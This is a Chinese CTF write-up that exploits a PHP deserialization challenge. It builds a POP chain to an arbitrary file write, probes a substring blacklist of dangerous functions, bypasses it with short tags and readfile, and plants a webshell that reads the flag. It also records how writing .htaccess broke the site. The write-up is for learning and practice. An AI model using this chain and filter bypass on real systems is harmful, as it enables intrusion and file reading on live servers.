# a-15 · 探索记录

对应题解：[`a-15.md`](./a-15.md)。

## 目标与起点

题面：「智慧报表导出系统，支持自定义 .tpl 模板，旧版元数据可能存在底层反序列化风险」。困难，500 分。

启动后是 PHP 7.4 + Apache，首页两个入口：`upload.php`（上传解析模板）和 `sdk.php`（下载模板引擎 SDK）。

## 第一阶段：读 SDK

`sdk.php` 直接返回 `SmartReport_Template_SDK.php`（12KB 源码），核心类都在里面。其中一条析构链非常完整：

```
TemplateMetadata::__destruct
  → renderer->warmUp($name)
     → postProcessor->handle("<!-- cached: $name -->")
        → archiver->archive($content)
           → file_put_contents($storagePath, $content)
```

`LocalFileArchiver::archive` 就是任意路径写文件，且内容里的 `$name` 完全可控。

## 第二阶段：摸清上传与过滤器

上传 `{{title}}`：

```
警告：模板文件格式正确，但元数据结构未识别。
```

上传 `O:8:"stdClass":0:{}`：

```
违规详情: 根对象类型未授权: [stdClass]，仅允许模板核心类
```

说明：文件内容会被 `unserialize()`，根对象有类白名单。

逐个测根类：

| 根类 | 结果 |
| --- | --- |
| `stdClass` / `LocalFileArchiver` | 未授权 |
| `TemplateEngine` / `TemplateParser` / `ReportRenderer` / `PdfRenderer` | 「元数据结构未识别」 |
| **`TemplateMetadata`** | **成功导入并加载** |

### 过滤器的边界（逐项探测）

| 内容 | 结果 |
| --- | --- |
| `<?php` / `<?PHP` | 拦：标准 PHP 标签 |
| `<?=` | 拦：短回显标签 |
| `<?`（短标签） | **放行** |
| `system(` / `exec(` / `passthru(` / `popen(` / `include(` / `file_get_contents(` | 拦 |
| `readfile(` / `phpinfo(` / `print_r(` / `highlight_file(` | **放行** |
| `DatabaseSource` 对象 | 拦 `exec()` —— 因为属性名 `queryExecutor` 含 `Exec` |
| `SystemConfig` 对象 | 拦 `system()` —— 类名含 `System` |

**过滤是对整个文件内容做大小写不敏感的子串匹配**，所以构造 payload 时要同时避开标签和函数名。

## 第三阶段：构造 POP 链（踩了两个坑）

### 坑一：直接写 `.htaccess` 把站点打挂

第一次把 `storagePath` 设成 `/var/www/html/.htaccess`，想用 `AddType` 让 `.txt` 被解析。但内容固定是 `<!-- cached: hi -->`，**第一行不是合法 Apache 指令**，整个目录 500，站点直接不可用。只能 close + start 重开实例（会换 flag）。

教训：写文件之前先确认「写入的内容在这个文件类型里是否合法」。

### 坑二：`unserialize` 失败与「元数据结构未识别」

手写序列化时，长度算错或类名/属性名触发过滤器，都会表现为同一句「元数据结构未识别」，无法直接区分原因。解决方法是用固定模板逐步加层级：

1. `TemplateMetadata(renderer=null)` → 成功
2. 加 `ReportRenderer(postProcessor=null)` → 成功
3. 加 `ExportPostProcessor(archiver=null)` → 成功
4. 加 `LocalFileArchiver` → 成功

一层层加，哪层失败就是哪层的问题。另外注意**属性名也会被扫描**（`queryExecutor` 触发 `exec`），所以不能随便复用真实属性名。

## 第四阶段：落盘 webshell

最终 payload：

```python
name = "?><? readfile('/challenge/flag.txt'); ?>"
# storagePath = /var/www/html/t15.php
# 完整链：TemplateMetadata → ReportRenderer → ExportPostProcessor → LocalFileArchiver
```

上传成功（「模板元数据已成功导入并加载！」），说明 `__destruct` 执行、文件已写。

请求落盘文件：

```bash
curl http://$T/t15.php
# <!-- cached: ?>flag{84227ca0-4052-428a-a707-f65d9e15aeae} -->
```

**短标签 `<?` 在这个环境是开启的**，所以 `readfile` 生效。

## 走不通 / 走过的弯路（留档）

| 方向 | 结果 | 判据 |
| --- | --- | --- |
| 普通 `{{title}}` 模板 | 元数据未识别 | 不是普通模板语法，是序列化 |
| `stdClass` 根对象 | 未授权 | 根类白名单 |
| `<?php` / `<?=` | 拦 | 标签检测 |
| `system/exec/popen/include/file_get_contents` | 拦 | 函数黑名单 |
| 写 `.htaccess` | **站点 500** | 内容首行不是合法指令，自毁 |
| 属性名 `queryExecutor` | 拦 `exec()` | 子串匹配连属性名也扫 |
| **短标签 + `readfile` + `LocalFileArchiver`** | **成功** | 写 `/var/www/html/t15.php` 并读 flag |

## 这次真正的收获

1. **`sdk.php` 这类「下载 SDK」入口等于给源码。** 题目说反序列化，站点直接给类定义，先把 `__destruct`/`handle`/`archive` 串一遍。
2. **类白名单常常只检查根对象。** 根 `TemplateMetadata` 通过后，嵌套的 `ReportRenderer/ExportPostProcessor/LocalFileArchiver` 只要不在黑名单里就能用。
3. **子串过滤器要逐项探测。** 禁 `<?php` 但开短标签、禁 `system` 但放 `readfile`；连序列化里的属性名也会被扫（`queryExecutor` → `exec`）。
4. **写文件前先想目标文件会不会被解析。** `.htaccess` 写坏会让整站 500，而且没法通过应用删掉，只能重启实例。
5. **「元数据结构未识别」是笼统错误。** 用逐层加层级的方式定位失败点，比对着一个 400 字符的序列化串猜长度快。
6. **`__destruct` 与后续请求是两条时间线。** 上传时可能输出，落盘后请求也可能输出；落盘文件更可控。

---

## 补充：2026-10-27 本轮的卡点

### `<?php` 被模板审计拦

| payload | 结果 | 判据 |
| --- | --- | --- |
| `<?php echo 'PWN'; readfile('/challenge/flag.txt'); ?>` | 上传页 `alert-danger`：`安全策略违规：模板内容未通过安全审计。违规详情: 检测到标准PHP脚本标签 (<?php)` | 黑名单匹配字面量 `<?php` |
| `?><? readfile('/challenge/flag.txt'); ?>` | 写入成功，`GET /t15.php` → `<!-- cached: ?>flag{...} -->` | 没有 `<?php` 子串 |

`?>` 先把模板里"假想的开标签"闭合掉，剩下的 `<? readfile(...); ?>` 是短标签，不在黑名单里。

**判据**：报错直接把匹配到的子串打出来了——过滤的是 `<?php` 这五个字符，不是"PHP 代码"。
